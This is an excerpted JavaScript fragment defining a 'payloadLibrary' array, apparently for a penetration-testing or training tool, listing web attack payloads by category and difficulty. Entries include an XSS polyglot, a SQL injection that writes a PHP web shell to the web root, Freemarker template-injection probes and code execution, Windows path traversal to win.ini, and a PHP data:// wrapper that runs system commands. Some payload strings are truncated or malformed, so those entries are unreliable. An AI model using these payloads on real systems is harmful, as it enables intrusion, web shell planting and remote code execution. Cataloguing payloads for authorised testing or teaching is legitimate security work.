...
const payloadLibrary = [
    ...
    { id: 10, title: 'XSS - Polyglot', category: 'xss', difficulty: 'hard', description: 'Universal XSS payload that works in multiple contexts', payload: 'jaVasCript:/*-/*/*\\/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e', tags: ['polyglot', 'universal', 'advanced'] },
    ...
    { id: 20, title: 'SQLi - MySQL INTO OUTFILE', category: 'sqli', difficulty: 'hard', description: 'Write web shell to file', payload: \"' UNION SELECT '<?php system(\[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--\", tags: ['mysql', 'outfile', 'webshell'] },
    ...
    { id: 26, title: 'Freemarker SSTI Test', category: 'ssti', difficulty: 'easy', description: 'Test for Freemarker SSTI vulnerability', payload: '\', tags: ['freemarker', 'test', 'java'] },
    { id: 27, title: 'Freemarker RCE', category: 'ssti', difficulty: 'hard', description: 'Remote code execution via Freemarker SSTI', payload: '<#assign ex=\"freemarker.template.utility.Execute\"?new()>\', tags: ['freemarker', 'rce', 'java'] },
    ...
    { id: 32, title: 'Windows LFI - win.ini', category: 'lfi', difficulty: 'easy', description: 'Read win.ini on Windows systems', payload: '..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini', tags: ['traversal', 'windows', 'basic'] },
    ...
    { id: 39, title: 'Data URI Wrapper', category: 'lfi', difficulty: 'medium', description: 'Execute code using data URI wrapper', payload: 'data://text/plain,<?php system(\[\"cmd\"]); ?>', tags: ['data-uri', 'php', 'rce'] },
